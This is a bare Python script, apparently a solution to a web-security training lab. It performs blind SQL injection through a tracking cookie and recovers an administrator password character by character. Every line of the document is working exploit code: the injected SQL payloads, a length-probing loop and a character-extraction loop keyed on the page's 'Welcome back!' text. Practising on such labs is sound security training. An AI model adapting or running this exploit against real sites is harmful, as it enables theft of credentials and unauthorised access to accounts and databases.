import requests
import string


url = "https://ac121fd01f8c8defc0e21fe100f90097.web-security-academy.net/filter?category=Tech+gifts"

################################ Size of Password #################################
size_pwd = 0
aux_cont = 0
print('= Verify size of password =')
while True:
    aux_cont = aux_cont + 1
    exploit =f"ExOsqJoy2xYLuwRG' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{aux_cont})='a"
    cookie = {
        "TrackingId":exploit, 
        "session":"9cVVlz1D8dog7nfABF3YMBCgV3Su8IAx"
    }
    r = requests.get(url, cookies=cookie)
    if 'Welcome back!' in r.text:
        size_pwd = size_pwd +1
    else:
        break
    #print (r.text)
print(f'Size of Password: {size_pwd + 1}')

pwd_final = size_pwd+1

password = list('')
leter = string.ascii_lowercase + string.digits
leters = list(leter)
print('= Stealing password =')
while True:
    for character in leters:
        position = len(password) + 1
        exploit_password =f"ExOsqJoy2xYLuwRG' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}"
        cookie = {
            "TrackingId":exploit_password, 
            "session":"DpYzdTK6qYrghyDp8Z1MUn2D11NLfDjG"
        }
        r = requests.get(url, cookies=cookie)
        if 'Welcome back!' in r.text:
            password.append(character)
            break
        #print(f"Password = {''.join(password) + character}")
    if position == (pwd_final+1):
        break

print(f"Final Password: {''.join(password)}")


